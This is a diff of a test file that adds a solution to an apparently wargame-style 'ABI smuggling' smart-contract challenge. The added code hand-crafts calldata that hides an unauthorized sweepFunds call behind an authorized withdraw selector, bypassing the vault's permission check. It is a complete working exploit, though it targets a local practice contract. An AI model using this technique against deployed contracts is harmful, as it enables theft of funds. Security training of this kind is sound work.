@@ -22,6 +22,7 @@ describe("[Challenge] ABI smuggling", function () {
     const deployerPermission = await vault.getActionId("0x85fb709d", deployer.address, vault.address)
     const playerPermission = await vault.getActionId("0xd9caed12", player.address, vault.address)
     await vault.setPermissions([deployerPermission, playerPermission])
+
     expect(await vault.permissions(deployerPermission)).to.be.true
     expect(await vault.permissions(playerPermission)).to.be.true
 
@@ -46,6 +47,28 @@ describe("[Challenge] ABI smuggling", function () {
 
   it("Execution", async function () {
     /** CODE YOUR SOLUTION HERE */
+
+    // deployer is authorized to sweepFunds() =>0x85fb709d
+    // player  is authorized to withdraw() =>0xd9caed12
+    // execute is => 0x1cff79cd
+
+    // 0x1cff79cd => SELECTOR FOR EXECUTE
+    // 000000000000000000000000e7f1725e7734ce288f8367e1bb143e90bb3f0512 => ADDRESS target
+    // 0000000000000000000000000000000000000000000000000000000000000080 => BYTES OFFSET actionData
+    // 0000000000000000000000000000000000000000000000000000000000000000 => BYTES LENGTH actionData
+    // d9caed1200000000000000000000000000000000000000000000000000000000 => SELECTOR FOR WITHDRAW (authorized)
+    // 00000000000000000000000000000000000000000000000000000000000000 =>
+    // 4485fb709d0000000000000000000000003C44CdDdB6a900fa2b585dd299e03d12
+    // FA4293BC0000000000000000000000005fbdb2315678afecb367f032d93f642f
+    // 64180aa300000000000000000000000000000000000000000000000000000000
+
+    let functionCalldata =
+      "0x1cff79cd000000000000000000000000e7f1725e7734ce288f8367e1bb143e90bb3f051200000000000000000000000000000000000000000000000000000000000000800000000000000000000000000000000000000000000000000000000000000000d9caed1200000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000004485fb709d0000000000000000000000003C44CdDdB6a900fa2b585dd299e03d12FA4293BC0000000000000000000000005fbdb2315678afecb367f032d93f642f64180aa300000000000000000000000000000000000000000000000000000000"
+
+    await player.sendTransaction({
+      to: vault.address,
+      data: functionCalldata,
+    })
   })
 
   after(async function () {
